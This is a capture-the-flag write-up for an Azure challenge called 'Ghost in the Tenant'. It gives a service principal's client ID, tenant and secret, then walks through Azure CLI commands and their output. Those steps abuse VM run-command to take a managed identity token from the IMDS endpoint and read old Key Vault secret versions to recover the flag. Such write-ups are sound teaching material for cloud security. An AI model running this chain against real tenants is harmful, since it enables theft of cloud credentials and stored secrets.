# Ghost in the Tenant

## Description

The vault stands in plain sight, yet remains silent. An instance exists within the same boundary, but not all identities are equal. Access is not denied, it is simply misplaced. Become what the vault expects, and it may answer.

Challenge credentials:

```yaml
Client Id: 3874eff6-1931-4b95-8ff0-a697a8fd47b1
Tenant Id: 07cb5c87-9226-4baf-9293-15e53e7f634f
Client Secret: 0Kz8Q~jZfphVQsLmBsghsayABNkc4A-JO1LXPcsT
```

Flag Format: hackzero{}

## Writeup

```bash
az login --service-principal -u "3874eff6-1931-4b95-8ff0-a697a8fd47b1" -p "0Kz8Q~jZfphVQsLmBsghsayABNkc4A-JO1LXPcsT" --tenant "07cb5c87-9226-4baf-9293-15e53e7f634f"
```

```json
[
  {
    "cloudName": "AzureCloud",
    "homeTenantId": "07cb5c87-9226-4baf-9293-15e53e7f634f",
    "id": "d7f5ab5f-aa83-4abb-9f23-09051c0f24a1",
    "isDefault": true,
    "name": "Azure subscription 1",
    "state": "Enabled",
    "tenantId": "07cb5c87-9226-4baf-9293-15e53e7f634f",
    "user": {
      "name": "3874eff6-1931-4b95-8ff0-a697a8fd47b1",
      "type": "servicePrincipal"
    }
  }
]
```

List the resources:

```bash
az resource list --output table
```

```text
Name        ResourceGroup    Location       Type
----------  ---------------  -------------  -----------------------------
HackZero    HackZero-CTF-RG  southeastasia  Microsoft.KeyVault/vaults
ctf         HackZero-CTF-RG  centralindia   Microsoft.Compute/virtualMachines
```

Show the Key Vault configuration:

```bash
az keyvault show -g HackZero-CTF-RG -n HackZero
```

```json
{
  "name": "HackZero",
  "resourceGroup": "HackZero-CTF-RG",
  "properties": {
    "enableRbacAuthorization": false,
    "vaultUri": "https://hackzero.vault.azure.net/",
    "accessPolicies": [
      {
        "objectId": "3e0baaff-f74e-4fdf-8b4d-af7852affd83"
      },
      {
        "objectId": "21b81251-3f4c-4f06-ad62-6e678fe0878b",
        "permissions": {
          "secrets": [
            "get",
            "list"
          ]
        }
      }
    ]
  }
}
```

Show the VM configuration:

```bash
az vm show -g HackZero-CTF-RG -n ctf
```

```json
{
  "name": "ctf",
  "resourceGroup": "HackZero-CTF-RG",
  "identity": {
    "principalId": "21b81251-3f4c-4f06-ad62-6e678fe0878b",
    "tenantId": "07cb5c87-9226-4baf-9293-15e53e7f634f",
    "type": "SystemAssigned"
  }
}
```

Try reading the vault directly as the provided service principal:

```bash
az keyvault secret list --vault-name HackZero
```

```text
ERROR: (Forbidden) The user, group or application 'appid=3874eff6-1931-4b95-8ff0-a697a8fd47b1;oid=73dd20a7-60c6-4046-ade4-9fbd1151c6fc;iss=https://sts.windows.net/07cb5c87-9226-4baf-9293-15e53e7f634f/' does not have secrets list permission on key vault 'HackZero;location=southeastasia'.
```

So the provided identity is the wrong one. The VM identity is what the vault expects.

Using `run-command` on the VM to request a managed identity token from IMDS and query the current `flag` secret:

```bash
az vm run-command invoke -g HackZero-CTF-RG -n ctf --command-id RunShellScript --scripts 'curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"'
```

```bash
az vm run-command invoke -g HackZero-CTF-RG -n ctf --command-id RunShellScript --scripts 'curl -H "Authorization: Bearer <token>" "https://hackzero.vault.azure.net/secrets/flag?api-version=7.4"'
```

Finally running them to get the fla-

```json
{
  "value": [
    {
      "message": "Enable succeeded: \n[stdout]\n{\"value\":\"nooooooooo\",\"id\":\"https://hackzero.vault.azure.net/secrets/flag/ef75d98a648341e4947c967347799b7c\",\"attributes\":{\"enabled\":true},\"tags\":{}}\n[stderr]\n"
    }
  ]
}
```

The current value is nooooooooot real so list the versions of the secret:

```bash
az vm run-command invoke -g HackZero-CTF-RG -n ctf --command-id RunShellScript --scripts 'TOKEN=$(curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" | jq -r .access_token)' 'curl -H "Authorization: Bearer $TOKEN" "https://hackzero.vault.azure.net/secrets/flag/versions?api-version=7.4"'
```

```json
{
  "value": [
    {
      "message": "Enable succeeded: \n[stdout]\n{\"value\":[{\"id\":\"https://hackzero.vault.azure.net/secrets/flag/4c2a5196eecf482bac3e99079897d536\"},{\"id\":\"https://hackzero.vault.azure.net/secrets/flag/6e911c79e69a4a09b84bf686d745f7ce\"},{\"id\":\"https://hackzero.vault.azure.net/secrets/flag/9bd7caeade7f4bbc99e48e7d22fa26bc\"},{\"id\":\"https://hackzero.vault.azure.net/secrets/flag/d0288eb1fc93416cb8c3f421394d92c8\"},{\"id\":\"https://hackzero.vault.azure.net/secrets/flag/ef75d98a648341e4947c967347799b7c\"},{\"id\":\"https://hackzero.vault.azure.net/secrets/flag/ff7a98f8ac8343b898917df2bf9432a9\"}],\"nextLink\":null}\n[stderr]\n"
    }
  ]
}
```

One of the versions `9bd7caeade7f4bbc99e48e7d22fa26bc` had the flag:

```json
{
  "value": [
    {
      "message": "Enable succeeded: \n[stdout]\n{\"value\":\"hackzero{8bc7ff831fdb83fdd07432cf89b6c059}\",\"id\":\"https://hackzero.vault.azure.net/secrets/flag/9bd7caeade7f4bbc99e48e7d22fa26bc\",\"attributes\":{\"enabled\":true},\"tags\":{}}\n[stderr]\n"
    }
  ]
}
```

`hackzero{8bc7ff831fdb83fdd07432cf89b6c059}`
